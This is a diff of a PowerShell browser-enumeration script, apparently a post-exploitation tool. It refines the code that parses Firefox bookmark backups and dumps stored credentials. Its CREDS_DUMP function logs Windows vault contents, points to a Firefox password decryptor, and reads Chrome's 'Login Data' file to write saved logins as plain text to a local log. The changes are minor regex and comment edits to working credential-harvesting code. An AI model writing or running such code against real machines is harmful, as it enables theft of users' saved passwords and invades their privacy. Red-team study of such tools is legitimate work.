@@ -266,15 +266,16 @@ function FIREFOX {
     ## TODO: Retrieve FireFox bookmarks
     echo "`nFirefox Bookmarks" >> $LogFilePath\BrowserEnum.log
     echo "-----------------" >> $LogFilePath\BrowserEnum.log
-    $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4-" # delete last - from Path
+    $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4" # delete last - from Path
         If(-not(Test-Path -Path "$Bookmarks_Path")) {
             echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
         }else{
             ## TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
             # 'primitive JSON invalid error' parsing jsonlz4 to text|csv ...
+            # $Regex = $Json -replace '[^a-zA-Z0-9/:.]','' # Replace all chars that does not match the Regex
             $Json = Get-Content "$Bookmarks_Path" -Raw
-            $ParsingData = $Json -replace '.*_','' -replace '.*©','' -replace '.*®','' -replace '.*¯','' -replace '.*ø','' -replace '.*þ','' -replace '.*Š','' -replace '.*‡','' -replace '.*¼','' -replace '.*±','' -replace '.*§','' -replace '.*™','' -replace '.*†','' -replace '.*»','' -replace '.*¥',''
-                ForEach ($Key in $ParsingData){
+            $Regex = $Json -replace '.*_','' -replace '.*©','' -replace '.*®','' -replace '.*¯','' -replace '.*ø','' -replace '.*þ','' -replace '.*Š','' -replace '.*‡','' -replace '.*¼','' -replace '.*±','' -replace '.*§','' -replace '.*™','' -replace '.*†','' -replace '.*»','' -replace '.*¥',''
+                ForEach ($Key in $Regex){
                     echo "$Key" >> $LogFilePath\BrowserEnum.log
                 }
         }
@@ -392,7 +393,7 @@ function CHROME {
 
 
 function ADDONS {  
-    ## TODO: Retrieve IE addons
+    ## Retrieve IE addons
     echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
     echo "`nName" >> $LogFilePath\BrowserEnum.log
     echo "----" >> $LogFilePath\BrowserEnum.log
@@ -449,7 +450,7 @@ function CREDS_DUMP {
         echo "$DumpVault" >> $LogFilePath\BrowserEnum.log
     }
 
-    ## TODO: Retrieve FireFox Credentials
+    ## Retrieve FireFox Credentials
     echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
     echo "`ngit clone https://github.com/Unode/firefox_decrypt.git" >> $LogFilePath\BrowserEnum.log
     echo "------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
@@ -463,8 +464,8 @@ function CREDS_DUMP {
 
     ## TODO: Retrieve Chrome Credentials (plain text)
     echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
-    echo "`nEnumerating LogIn Data Stored Logins (plain text)" >> $LogFilePath\BrowserEnum.log
-    echo "-------------------------------------------------" >> $LogFilePath\BrowserEnum.log
+    echo "`nEnumerating LogIn Data Stored (plain text)" >> $LogFilePath\BrowserEnum.log
+    echo "------------------------------------------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
         echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
     }else{
@@ -472,12 +473,8 @@ function CREDS_DUMP {
         If(-not($Json) -or $Json -eq $null){
             echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
         }else{
-            $ParsingData1 = $Json -replace '♫','' -replace '☺','' -replace '►','' -replace '§','' -replace '↨','' -replace '♥','' -replace '♦',''
-            $ParsingData2 = $ParsingData1 -replace '♣','' -replace '♠','' -replace '¥','' -replace 'ž','' -replace '☻','' -replace '¹','' -replace '↓',''
-            $ParsingData3 = $ParsingData2 -replace '▼','' -replace '☼','' -replace '¶','' -replace '◄','' -replace '⌂','' -replace 'ô','' -replace '‡',''
-            $ParsingData4 = $ParsingData3 -replace '$','' -replace '€','' -replace '£','' -replace '½','' -replace 'ÿ','' -replace 'Æ','' -replace 'Ï',''
-            $ParsedData = $ParsingData4 -replace '¢','' -replace 'Œ','' -replace '¤','' -replace '¿','' -replace '®','' -replace 'æ','' -replace 'š','' -replace '      ',''
-            echo "$ParsedData" >> $LogFilePath\BrowserEnum.log
+            $Regex = $Json -replace '[^a-zA-Z0-9/:.]','' # Replace all chars that does not match the Regex
+            echo "$Regex" >> $LogFilePath\BrowserEnum.log
         }
     }
 }
